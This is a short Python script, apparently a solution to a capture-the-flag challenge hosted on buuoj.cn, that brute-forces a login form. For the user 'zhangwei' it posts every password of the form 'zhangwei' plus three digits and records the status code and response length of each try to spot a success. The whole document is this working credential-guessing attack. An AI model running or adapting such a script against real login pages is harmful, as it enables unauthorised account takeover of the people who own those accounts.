import requests
from string import digits, ascii_letters
import itertools
import time


url = "http://ede22497-5485-431d-b0bb-d6bfabe76903.node5.buuoj.cn:81/login.php"

res = list(itertools.product(digits, repeat=3))

dictionary = [''.join(v) for v in res]


with open('./res.txt', 'w') as f:
    for passwd in dictionary:
        data = {
            "username": 'zhangwei',
            'password': f'zhangwei{passwd}'
        }
        resp = requests.post(url, data=data)
        print(f"username:zhangwei\tpassword:zhangwei{passwd}\tresp_code:{resp.status_code}\tresp_length:{len(resp.text)}")
        f.write(f"username:zhangwei\tpassword:zhangwei{passwd}\tresp_code:{resp.status_code}\tresp_length:{len(resp.text)}\n")
        time.sleep(0.15)